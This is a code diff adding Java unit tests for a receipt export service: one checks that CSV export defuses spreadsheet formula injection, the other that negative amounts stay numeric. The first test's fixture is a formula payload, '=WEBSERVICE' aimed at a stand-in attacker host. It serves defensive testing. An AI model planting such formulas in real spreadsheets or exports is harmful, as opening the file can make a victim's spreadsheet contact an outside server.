@@ -91,6 +91,33 @@ class ReceiptExportServiceTest {
     }
 
     @Test
+    void csv_neutralizesFormulaInjectionInAttackerInfluencedCells() {
+        // Item descriptions come from receipt text a merchant (or a forged
+        // receipt) controls — a leading '=' must not survive as a formula.
+        when(reportAssembler.assemble(eq(user), any(), any()))
+                .thenReturn(reportWith(row("=WEBSERVICE(\"https://evil.example\")", "14.00")));
+
+        var csv = new String(service.exportPurchaseHistory(user, null, null, ExportFormat.CSV).content(),
+                StandardCharsets.UTF_8);
+
+        assertThat(csv).doesNotContain(";=WEBSERVICE");
+        assertThat(csv).contains("'=WEBSERVICE");
+    }
+
+    @Test
+    void csv_keepsNegativeAmountsUnquoted() {
+        when(reportAssembler.assemble(eq(user), any(), any()))
+                .thenReturn(reportWith(row("DESCONTO CUPOM", "-2.50")));
+
+        var csv = new String(service.exportPurchaseHistory(user, null, null, ExportFormat.CSV).content(),
+                StandardCharsets.UTF_8);
+
+        // A legitimate negative number stays numeric for Excel (no apostrophe).
+        assertThat(csv).contains(";-2,50;");
+        assertThat(csv).doesNotContain("'-2,50");
+    }
+
+    @Test
     void xlsxAndPdf_delegateToRenderers() {
         var report = reportWith(row("ARROZ", "10.00"));
         when(reportAssembler.assemble(eq(user), any(), any())).thenReturn(report);
